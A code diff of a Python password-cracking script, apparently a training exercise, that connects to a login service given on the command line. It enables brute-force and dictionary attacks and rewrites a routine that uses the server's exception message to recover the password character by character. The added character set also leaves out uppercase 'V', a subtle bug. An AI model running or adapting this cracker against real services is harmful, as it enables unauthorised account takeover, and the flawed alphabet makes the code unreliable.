@@ -4,7 +4,7 @@ import itertools
 import os
 import json
 
-ALPHA_DIG = "abcdefghijklmnopqrstuvwxyz0123456789"
+ALPHA_DIG = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789"
 
 def orginize_file_data(file):
     pass_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), file)
@@ -32,9 +32,10 @@ def checker(data, client_socket, bufor=1024):
         response = client_socket.recv(bufor)
         response = response.decode()
         response = json.loads(response)
-        if response["result"] == "Exception happened during login" \
-        or response["result"] == "Connection success!":
+        if response["result"] == "Exception happened during login":
             return data
+        if response["result"] == "Connection success!":
+            return response["result"]
 
     for p in data:
         bp = p.encode()
@@ -43,9 +44,6 @@ def checker(data, client_socket, bufor=1024):
         response = response.decode()
         if response == "Connection success!":
             return p
-
-        # json.dumps(response["result"]) == "Wrong password!" or \
-        # json.dumps(response["result"]) == "Exception happened during login":
 
 def brute_force_possibl(rep):
     brute_force_str = ALPHA_DIG
@@ -93,24 +91,20 @@ def exploit_vonul(client_socket):
         if corr_log:
             corr_log = corr_log["login"]
             corr_pass = ""
-            for char in ALPHA_DIG:
-                data = {"login": corr_log, "password": char}
-                corr_pass_char = checker(data, client_socket)
-                if corr_pass_char:
-                    corr_pass += corr_pass_char["password"]
-                else:
-                    data = {"login": corr_log, "password": char.upper()}
+            flag = True
+            while flag:
+                for char in ALPHA_DIG:
+                    pass_char = corr_pass + char
+                    data = {"login": corr_log, "password": pass_char}
                     corr_pass_char = checker(data, client_socket)
+                    if corr_pass_char == "Connection success!":
+                        corr_pass += char
+                        flag = False
+                        break
                     if corr_pass_char:
-                        corr_pass += corr_pass_char["password"]
+                        corr_pass += char
 
             return json.dumps({"login": corr_log, "password": corr_pass})
-
-            # musi wertować cały czas od a-0 na razie jak znajdzie jedną to
-            # leci dalej z alfabetem dlatego nigdy nie zadziała jak np a jest drugie,
-            # bo juz je pominął
-
-
 
 def connect(client_socket):
     hostname = sys.argv[1]
@@ -122,8 +116,8 @@ def connect(client_socket):
 def main():
     with socket.socket() as client_socket:
         connect(client_socket)
-        # print(brute_force(client_socket))
-        # print(dict_brute_force(client_socket))
+        print(brute_force(client_socket))
+        print(dict_brute_force(client_socket))
         print(exploit_vonul(client_socket))
 
 if __name__ == "__main__":
